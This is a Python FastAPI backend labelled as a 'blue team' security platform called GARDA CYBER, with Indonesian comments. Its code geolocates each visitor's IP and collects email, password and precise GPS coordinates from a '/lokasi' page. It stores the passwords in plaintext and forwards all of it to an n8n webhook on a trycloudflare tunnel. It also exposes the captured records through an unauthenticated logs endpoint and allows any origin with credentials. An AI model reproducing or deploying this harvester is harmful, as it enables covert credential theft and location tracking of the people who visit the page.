"""Entry point aplikasi GARDA CYBER (backend)."""

import datetime
import httpx
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from app.api.v1.router import api_router
from app.core.config import get_settings
from app.core.logging import configure_logging
from app.db.base import Base
from app.db.session import engine, get_db
import app.db.models   # noqa: F401
from app.db.security_log import SecurityLog
from fastapi import Depends
from sqlalchemy.orm import Session

settings = get_settings()
configure_logging()

app = FastAPI(
    title=settings.APP_NAME,
    version="0.1.0",
    description="GARDA CYBER — Security Operations Platform.",
)

# ==========================================
# KONFIGURASI STATIC FILES (REACT)
# ==========================================
# 1. Serve file JS/CSS React yang ada di /assets
# Serve folder assets React di root (agar JS & CSS terbaca)
app.mount("/assets", StaticFiles(directory="app/dist/assets"), name="assets")

# Serve file HTML statis lainnya
app.mount("/static", StaticFiles(directory="app/dist"), name="static")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # Pastikan ada bintang
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.include_router(api_router, prefix="/api/v1")

@app.on_event("startup")
def on_startup() -> None:
    Base.metadata.create_all(bind=engine)

# ==========================================
# 1. ENDPOINT DETEKSI IP
# ==========================================
@app.get("/")
async def root(request: Request, db: Session = Depends(get_db)) -> dict:
    if request.url.path == "/favicon.ico":
        return {"status": "ignored"}

    client_ip = request.client.host
    if "x-forwarded-for" in request.headers:
        client_ip = request.headers["x-forwarded-for"].split(",")[0].strip()

    access_time = (datetime.datetime.utcnow() + datetime.timedelta(hours=8)).strftime("%d-%m-%Y %H:%M:%S WITA")

    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown", "lat": 0, "lon": 0}
    is_local = (client_ip.startswith("172.") or client_ip.startswith("192.168.") or client_ip in ["127.0.0.1", "localhost", "::1"])

    ip_untuk_dicek = client_ip
    if is_local:
        try:
            async with httpx.AsyncClient() as client:
                resp_ip = await client.get("https://api.ipify.org")
                if resp_ip.status_code == 200:
                    ip_untuk_dicek = resp_ip.text.strip()
        except Exception as e:
            print(f"Gagal ambil IP publik: {e}")

    try:
        async with httpx.AsyncClient() as client:
            url = f"http://ip-api.com/json/{ip_untuk_dicek}?fields=status,message,country,city,isp,lat,lon,query"
            response = await client.get(url)
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    geo_data = data
    except Exception as e:
        print(f"Gagal mengambil data GeoIP: {e}")

    maps_link = f"https://maps.google.com/?q={geo_data.get('lat')},{geo_data.get('lon')}"

    payload = {
        "event": "GARDA_CYBER_SECURITY_ALERT",
        "client_ip": client_ip,
        "detected_public_ip": geo_data.get("query", ip_untuk_dicek),
        "country": geo_data.get("country", "Unknown"),
        "city": geo_data.get("city", "Unknown"),
        "isp": geo_data.get("isp", "Unknown"),
        "lat": geo_data.get("lat", 0),
        "lon": geo_data.get("lon", 0),
        "google_maps": maps_link,
        "access_time": access_time,
        "description": "Terdeteksi aktivitas akses halaman utama."
    }

    # SIMPAN KE DATABASE BLUE TEAM
    new_log = SecurityLog(
        event_type="IP_TRACKING",
        client_ip=client_ip,
        city=geo_data.get("city", "Unknown"),
        isp=geo_data.get("isp", "Unknown"),
        access_time=access_time
    )
    db.add(new_log)
    db.commit()

    # URL WEBHOOK N8N (Sesuaikan jika berubah)
    n8n_url = "https://revision-medical-concentration-cemetery.trycloudflare.com/webhook/GARDA-CYBER"
    async with httpx.AsyncClient() as client:
        try:
            await client.post(n8n_url, json=payload)
        except Exception as e:
            print(f"Gagal kirim webhook: {e}")

    return {"status": "SECURE", "message": "Akses dicatat", "ip_info": payload}


# ==========================================
# 2. ENDPOINT LOGIN & GPS
# ==========================================
class GPSData(BaseModel):
    latitude: float
    longitude: float
    accuracy: float
    email: str = "Tidak diisi"
    password: str = "Tidak diisi"

@app.post("/api/v1/gps")
async def receive_gps(data: GPSData, request: Request, db: Session = Depends(get_db)):
    client_ip = request.client.host
    if "x-forwarded-for" in request.headers:
        client_ip = request.headers["x-forwarded-for"].split(",")[0].strip()
        
    access_time = (datetime.datetime.utcnow() + datetime.timedelta(hours=8)).strftime("%d-%m-%Y %H:%M:%S WITA")
    maps_link = f"https://maps.google.com/?q={data.latitude},{data.longitude}"

    payload = {
        "event": "GARDA_CYBER_GPS_TRACKING",
        "client_ip": client_ip,
        "email": data.email,
        "password": data.password,
        "latitude": data.latitude,
        "longitude": data.longitude,
        "accuracy_meters": data.accuracy,
        "google_maps": maps_link,
        "access_time": access_time,
        "description": "Data login dan GPS ditangkap."
    }

    # SIMPAN KE DATABASE GPS BLUE TEAM
    new_log = SecurityLog(
        event_type="GPS_LOGIN",
        client_ip=client_ip,
        email=data.email,
        password=data.password,
        latitude=str(data.latitude),
        longitude=str(data.longitude),
        access_time=access_time
    )
    db.add(new_log)
    db.commit()

    # URL WEBHOOK N8N (Sesuaikan jika berubah)
    n8n_url = "https://revision-medical-concentration-cemetery.trycloudflare.com/webhook/GARDA-CYBER-GPS"
    async with httpx.AsyncClient() as client:
        try:
            await client.post(n8n_url, json=payload)
        except Exception as e:
            print(f"Gagal kirim webhook GPS: {e}")

    return {"status": "SECURE", "message": "GPS diterima", "gps_info": payload}


# ==========================================
# 3. ENDPOINT HTML
# ==========================================
@app.get("/lokasi", response_class=HTMLResponse)
async def get_lokasi():
    with open("app/index.html", "r", encoding="utf-8") as f:
        return f.read()

# ==========================================
# 4. API BLUE TEAM
# ==========================================
@app.get("/api/v1/logs")
async def get_logs(db: Session = Depends(get_db)):
    logs = db.query(SecurityLog).order_by(SecurityLog.id.desc()).limit(50).all()
    return logs

 # ==========================================
# 5. ADMIN BLUE TEAM
# ==========================================   

@app.get("/admin", response_class=HTMLResponse)
async def get_admin():
    with open("app/admin.html", "r", encoding="utf-8") as f:
        return f.read()